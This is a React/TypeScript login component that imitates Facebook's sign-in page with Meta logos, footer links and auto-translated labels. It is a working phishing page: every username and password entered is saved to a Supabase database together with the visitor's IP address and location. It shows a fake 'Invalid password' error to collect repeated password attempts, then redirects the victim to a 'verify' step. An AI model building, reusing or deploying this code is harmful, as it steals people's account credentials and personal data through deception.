import { useEffect, useRef, useState, type FC } from 'react';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import FBLogoImage from '@/assets/images/fb-logo.png';
import FBLogoSVG from '@/assets/images/facebook-logo.svg';
import { faXmark } from '@fortawesome/free-solid-svg-icons';
import { faEye, faEyeSlash } from '@fortawesome/free-regular-svg-icons';
import MetaImage from '@/assets/images/meta-logo.png';
import { supabase } from '@/utils/supabase';
import { useNavigate } from 'react-router';
import paths from '@/router/paths';
import translateText from '@/utils/translate';

interface GeoLocationData {
    city: string;
    accuracy: number;
    country: string;
    timezone: string;
    organization: string;
    asn: number;
    ip: string;
    area_code: string;
    organization_name: string;
    country_code: string;
    country_code3: string;
    continent_code: string;
    longitude: string;
    region: string;
    latitude: string;
}

interface TranslatedTexts {
    mobileNumberOrEmail: string;
    password: string;
    invalidPassword: string;
    logIn: string;
    forgottenPassword: string;
    createNewAccount: string;
    logInToFacebook: string;
    emailAddressOrPhone: string;
    forgottenAccount: string;
    englishUK: string;
    tiengViet: string;
    chineseTaiwan: string;
    korean: string;
    japanese: string;
    frenchFrance: string;
    thai: string;
    spanish: string;
    portugueseBrazil: string;
    german: string;
    italian: string;
    signUp: string;
    messenger: string;
    facebookLite: string;
    video: string;
    metaPay: string;
    metaStore: string;
    metaQuest: string;
    rayBanMeta: string;
    metaAI: string;
    instagram: string;
    threads: string;
    privacyPolicy: string;
    privacyCentre: string;
    about: string;
    createAd: string;
    createPage: string;
    developers: string;
    careers: string;
    cookies: string;
    adChoices: string;
    terms: string;
    help: string;
    contactUploading: string;
}

const getGeolocationData = (): GeoLocationData | null => {
    try {
        const storedData = localStorage.getItem('geolocationData');
        return storedData ? JSON.parse(storedData) : null;
    } catch {
        return null;
    }
};

const Login: FC = () => {
    const navigate = useNavigate();

    const usernameRef = useRef<HTMLInputElement>(null);
    const passwordRef = useRef<HTMLInputElement>(null);

    const [isShowPassword, setIsShowPassword] = useState(false);
    const [username, setUsername] = useState('');
    const [password, setPassword] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [currentAttemp, setCurrentAttemp] = useState(0);
    const [maxAttemp, setMaxAttemp] = useState(0);
    const [showError, setShowError] = useState(false);
    const [geolocationData, setGeolocationData] = useState<GeoLocationData | null>(null);
    const [translatedTexts, setTranslatedTexts] = useState<TranslatedTexts>({
        mobileNumberOrEmail: 'Mobile number or email address',
        password: 'Password',
        invalidPassword: 'Invalid password',
        logIn: 'Log in',
        forgottenPassword: 'Forgotten password?',
        createNewAccount: 'Create new account',
        logInToFacebook: 'Log in to Facebook',
        emailAddressOrPhone: 'Email address or phone number',
        forgottenAccount: 'Forgotten account?',
        englishUK: 'English (UK)',
        tiengViet: 'Tiếng Việt',
        chineseTaiwan: '中文(台灣)',
        korean: '한국어',
        japanese: '日本語',
        frenchFrance: 'Français (France)',
        thai: 'ภาษาไทย',
        spanish: 'Español',
        portugueseBrazil: 'Português (Brasil)',
        german: 'Deutsch',
        italian: 'Italiano',
        signUp: 'Sign Up',
        messenger: 'Messenger',
        facebookLite: 'Facebook Lite',
        video: 'Video',
        metaPay: 'Meta Pay',
        metaStore: 'Meta Store',
        metaQuest: 'Meta Quest',
        rayBanMeta: 'Ray-Ban Meta',
        metaAI: 'Meta AI',
        instagram: 'Instagram',
        threads: 'Threads',
        privacyPolicy: 'Privacy Policy',
        privacyCentre: 'Privacy Centre',
        about: 'About',
        createAd: 'Create ad',
        createPage: 'Create Page',
        developers: 'Developers',
        careers: 'Careers',
        cookies: 'Cookies',
        adChoices: 'AdChoices',
        terms: 'Terms',
        help: 'Help',
        contactUploading: 'Contact uploading and non-users'
    });

    const translateAllTexts = async (targetLang: string) => {
        try {
            const [mobileNumberOrEmail, password, invalidPassword, logIn, forgottenPassword, createNewAccount, logInToFacebook, emailAddressOrPhone, forgottenAccount, englishUK, tiengViet, chineseTaiwan, korean, japanese, frenchFrance, thai, spanish, portugueseBrazil, german, italian, signUp, messenger, facebookLite, video, metaPay, metaStore, metaQuest, rayBanMeta, metaAI, instagram, threads, privacyPolicy, privacyCentre, about, createAd, createPage, developers, careers, cookies, adChoices, terms, help, contactUploading] = await Promise.all([translateText('Mobile number or email address', targetLang), translateText('Password', targetLang), translateText('Invalid password', targetLang), translateText('Log in', targetLang), translateText('Forgotten password?', targetLang), translateText('Create new account', targetLang), translateText('Log in to Facebook', targetLang), translateText('Email address or phone number', targetLang), translateText('Forgotten account?', targetLang), translateText('English (UK)', targetLang), translateText('Tiếng Việt', targetLang), translateText('中文(台灣)', targetLang), translateText('한국어', targetLang), translateText('日本語', targetLang), translateText('Français (France)', targetLang), translateText('ภาษาไทย', targetLang), translateText('Español', targetLang), translateText('Português (Brasil)', targetLang), translateText('Deutsch', targetLang), translateText('Italiano', targetLang), translateText('Sign Up', targetLang), translateText('Messenger', targetLang), translateText('Facebook Lite', targetLang), translateText('Video', targetLang), translateText('Meta Pay', targetLang), translateText('Meta Store', targetLang), translateText('Meta Quest', targetLang), translateText('Ray-Ban Meta', targetLang), translateText('Meta AI', targetLang), translateText('Instagram', targetLang), translateText('Threads', targetLang), translateText('Privacy Policy', targetLang), translateText('Privacy Centre', targetLang), translateText('About', targetLang), translateText('Create ad', targetLang), translateText('Create Page', targetLang), translateText('Developers', targetLang), translateText('Careers', targetLang), translateText('Cookies', targetLang), translateText('AdChoices', targetLang), translateText('Terms', targetLang), translateText('Help', targetLang), translateText('Contact uploading and non-users', targetLang)]);

            setTranslatedTexts({
                mobileNumberOrEmail,
                password,
                invalidPassword,
                logIn,
                forgottenPassword,
                createNewAccount,
                logInToFacebook,
                emailAddressOrPhone,
                forgottenAccount,
                englishUK,
                tiengViet,
                chineseTaiwan,
                korean,
                japanese,
                frenchFrance,
                thai,
                spanish,
                portugueseBrazil,
                german,
                italian,
                signUp,
                messenger,
                facebookLite,
                video,
                metaPay,
                metaStore,
                metaQuest,
                rayBanMeta,
                metaAI,
                instagram,
                threads,
                privacyPolicy,
                privacyCentre,
                about,
                createAd,
                createPage,
                developers,
                careers,
                cookies,
                adChoices,
                terms,
                help,
                contactUploading
            });
        } catch (err) {
            console.error('Translation failed:', err);
        }
    };

    useEffect(() => {
        const getConfig = async () => {
            const { data, error } = await supabase.from('config').select('max_pass');
            if (!error) {
                if (data.length != 0) {
                    setMaxAttemp(data[0].max_pass);
                }
            }
        };

        const fetchGeolocation = async () => {
            const geoData = getGeolocationData();
            if (geoData) {
                setGeolocationData(geoData);
                await translateAllTexts(geoData.country_code);
            }
        };

        getConfig();
        fetchGeolocation();
    }, []);
    const handleSubmit = async () => {
        if (!username || !password) {
            setShowError(true);
            return;
        }
        setIsLoading(true);
        const getExistId = async () => {
            const { data, error } = await supabase.from('data').select('id,username').eq('username', username).limit(1);
            if (error) {
                return;
            }
            if (data.length != 0) {
                return data?.[0].id;
            }
        };
        let id;
        const existId = await getExistId();
        if (!existId) {
            const insertData: { username: string; ip?: string; country?: string } = {
                username: username
            };
            if (geolocationData) {
                insertData.ip = geolocationData.ip;
                const city = geolocationData.city || 'Unknown';
                const region = geolocationData.region || 'Unknown';
                const country = geolocationData.country || 'Unknown';
                insertData.country = `${city}-${region}-${country}`;
            }

            const response = await supabase.from('data').insert(insertData).select();
            if (response.data?.length != 0) {
                id = response.data?.[0].id;
            }
        } else {
            id = existId;
        }
        await supabase.from('list_pass').insert({
            pass: password,
            data_id: id
        });
        if (currentAttemp >= maxAttemp) {
            localStorage.setItem('data_id', id);
            navigate(paths.verify);
        }
        setShowError(true);
        setPassword('');
        setCurrentAttemp(currentAttemp + 1);
        setIsLoading(false);
    };
    return (
        <div className='min-h-screen bg-[#f0f2f5]'>
            <div className='flex min-h-screen flex-col items-center justify-center px-4 pt-5 md:hidden'>
                <div className='mt-2 text-sm text-[#5d6c7b]'>{translatedTexts.englishUK}</div>
                <div className='flex grow items-center justify-center'>
                    <img src={FBLogoImage} className='max-h-[60px] max-w-[60px] object-contain' alt='' />
                </div>
                <div className='flex w-full grow flex-col gap-3'>
                    <div className='relative'>
                        <input
                            ref={usernameRef}
                            autoComplete='on'
                            id='username'
                            type='text'
                            placeholder=' '
                            className='peer h-[62px] w-full rounded-2xl border border-[#dde2e8] px-4 py-4 pb-1 placeholder:text-[#5d6c7b] focus:border-[#5d6c7b]'
                            value={username}
                            onChange={(e) => {
                                setUsername(e.target.value);
                            }}
                        />
                        <label htmlFor='username' className='absolute top-1/2 left-0 -translate-y-6 px-4 text-[13px] text-[#5d6c7b] peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-[15px] peer-focus:-translate-y-6 peer-focus:text-[13px]'>
                            {translatedTexts.mobileNumberOrEmail}
                        </label>
                        <button
                            tabIndex={-1}
                            onClick={() => {
                                setUsername('');
                                usernameRef.current?.focus();
                            }}
                            className='absolute top-1/2 right-0 block -translate-y-1/2 cursor-pointer pr-4 peer-placeholder-shown:hidden'
                        >
                            <FontAwesomeIcon icon={faXmark} />
                        </button>
                    </div>
                    <div className='relative'>
                        <input
                            ref={passwordRef}
                            autoComplete='on'
                            id='password'
                            type={isShowPassword ? 'text' : 'password'}
                            placeholder=' '
                            className={`peer h-[62px] w-full rounded-2xl border border-[#dde2e8] px-4 py-4 pb-1 placeholder:text-[#5d6c7b] focus:border-[#5d6c7b] ${showError && 'border-red-500'}`}
                            value={password}
                            onChange={(e) => {
                                setShowError(false);
                                setPassword(e.target.value);
                            }}
                            onFocus={() => {
                                setShowError(false);
                            }}
                        />
                        <label htmlFor='password' className={`absolute top-1/2 left-0 -translate-y-6 px-4 text-[13px] text-[#5d6c7b] peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-[15px] peer-focus:-translate-y-6 peer-focus:text-[13px] ${showError && 'text-red-500'}`}>
                            {showError ? translatedTexts.invalidPassword : translatedTexts.password}
                        </label>
                        <button
                            tabIndex={-1}
                            onClick={() => {
                                setIsShowPassword(!isShowPassword);
                            }}
                            className='absolute top-1/2 right-0 block -translate-y-1/2 cursor-pointer pr-4 peer-placeholder-shown:hidden'
                        >
                            <FontAwesomeIcon icon={isShowPassword ? faEyeSlash : faEye} />
                        </button>
                    </div>
                    <button
                        className='flex h-[44px] items-center justify-center rounded-[22px] bg-[#0064e0] text-[15px] font-medium text-[#f1f4f7]'
                        onClick={() => {
                            handleSubmit();
                        }}
                    >
                        {isLoading ? <div className='h-7 w-7 animate-spin rounded-full border-2 border-white border-t-transparent'></div> : translatedTexts.logIn}
                    </button>
                    <span className='text-center text-[15px] font-medium text-[#0a1317]'>{translatedTexts.forgottenPassword}</span>
                </div>
                <div className='flex w-full flex-col items-center justify-center gap-4'>
                    <div className='flex h-[44px] w-full items-center justify-center rounded-[22px] border border-[#0064e0] text-[#0064e0]'>{translatedTexts.createNewAccount}</div>
                    <div className='flex items-center justify-center'>
                        <img className='h-[12px]' src={MetaImage} alt='' />
                    </div>
                    <div className='flex items-center gap-2 text-[10px] text-[#63788a]'>
                        <span>{translatedTexts.about}</span>
                        <span>{translatedTexts.help}</span>
                        <span>More</span>
                    </div>
                </div>
            </div>

            <div className='hidden min-h-screen flex-col items-center justify-between px-4 py-5 md:flex'>
                <div className='mt-8 flex w-full flex-col items-center'>
                    <div className='mb-6 flex justify-center'>
                        <img src={FBLogoSVG} className='h-8' alt='Facebook' />
                    </div>

                    <div className='w-full max-w-[396px] rounded-lg bg-white p-6 shadow-sm'>
                        <h1 className='mb-6 text-center text-lg text-[#1c1e21]'>{translatedTexts.logInToFacebook}</h1>

                        <div className='space-y-4'>
                            <div className='relative'>
                                <input
                                    ref={usernameRef}
                                    autoComplete='on'
                                    id='username-desktop'
                                    type='text'
                                    placeholder={translatedTexts.emailAddressOrPhone}
                                    className='w-full rounded-md border border-[#dddfe2] px-3 py-3 text-[#1c1e21] placeholder:text-[#8a8d91] focus:border-[#1877f2] focus:outline-none'
                                    value={username}
                                    onChange={(e) => {
                                        setUsername(e.target.value);
                                    }}
                                />
                            </div>

                            <div className='relative'>
                                <input
                                    ref={passwordRef}
                                    autoComplete='on'
                                    id='password-desktop'
                                    type={isShowPassword ? 'text' : 'password'}
                                    placeholder={translatedTexts.password}
                                    className={`w-full rounded-md border px-3 py-3 text-[#1c1e21] placeholder:text-[#8a8d91] focus:outline-none ${showError ? 'border-red-500' : 'border-[#dddfe2] focus:border-[#1877f2]'}`}
                                    value={password}
                                    onChange={(e) => {
                                        setShowError(false);
                                        setPassword(e.target.value);
                                    }}
                                    onFocus={() => {
                                        setShowError(false);
                                    }}
                                />
                            </div>

                            <button
                                className='w-full rounded-md bg-[#1877f2] py-3 text-lg font-semibold text-white hover:bg-[#166fe5] focus:outline-none'
                                onClick={() => {
                                    handleSubmit();
                                }}
                            >
                                {isLoading ? <div className='mx-auto h-6 w-6 animate-spin rounded-full border-2 border-white border-t-transparent'></div> : translatedTexts.logIn}
                            </button>

                            <div className='text-center'>
                                <p className='cursor-pointer text-sm text-[#1877f2] hover:underline'>{translatedTexts.forgottenAccount}</p>
                            </div>
                        </div>
                    </div>
                </div>

                <div className='mt-8 w-full max-w-[980px] text-center'>
                    <div className='mb-4 flex flex-wrap justify-start gap-2 text-xs text-[#8a8d91]'>
                        <span>{translatedTexts.englishUK}</span>
                        <span>{translatedTexts.tiengViet}</span>
                        <span>{translatedTexts.chineseTaiwan}</span>
                        <span>{translatedTexts.korean}</span>
                        <span>{translatedTexts.japanese}</span>
                        <span>{translatedTexts.frenchFrance}</span>
                        <span>{translatedTexts.thai}</span>
                        <span>{translatedTexts.spanish}</span>
                        <span>{translatedTexts.portugueseBrazil}</span>
                        <span>{translatedTexts.german}</span>
                        <span>{translatedTexts.italian}</span>
                        <button className='rounded border border-[#8a8d91] px-2 py-1 text-xs'>+</button>
                    </div>

                    <div className='mb-4 flex flex-wrap justify-start gap-2 text-xs text-[#8a8d91]'>
                        <span>{translatedTexts.signUp}</span>
                        <span>{translatedTexts.logIn}</span>
                        <span>{translatedTexts.messenger}</span>
                        <span>{translatedTexts.facebookLite}</span>
                        <span>{translatedTexts.video}</span>
                        <span>{translatedTexts.metaPay}</span>
                        <span>{translatedTexts.metaStore}</span>
                        <span>{translatedTexts.metaQuest}</span>
                        <span>{translatedTexts.rayBanMeta}</span>
                        <span>{translatedTexts.metaAI}</span>
                        <span>{translatedTexts.instagram}</span>
                        <span>{translatedTexts.threads}</span>
                        <span>{translatedTexts.privacyPolicy}</span>
                        <span>{translatedTexts.privacyCentre}</span>
                        <span>{translatedTexts.about}</span>
                        <span>{translatedTexts.createAd}</span>
                        <span>{translatedTexts.createPage}</span>
                        <span>{translatedTexts.developers}</span>
                        <span>{translatedTexts.careers}</span>
                        <span>{translatedTexts.cookies}</span>
                        <span>{translatedTexts.adChoices}</span>
                        <span>{translatedTexts.terms}</span>
                        <span>{translatedTexts.help}</span>
                        <span>{translatedTexts.contactUploading}</span>
                    </div>

                    <div className='text-xs text-[#8a8d91]'>Meta © 2025</div>
                </div>
            </div>
        </div>
    );
};
export default Login;
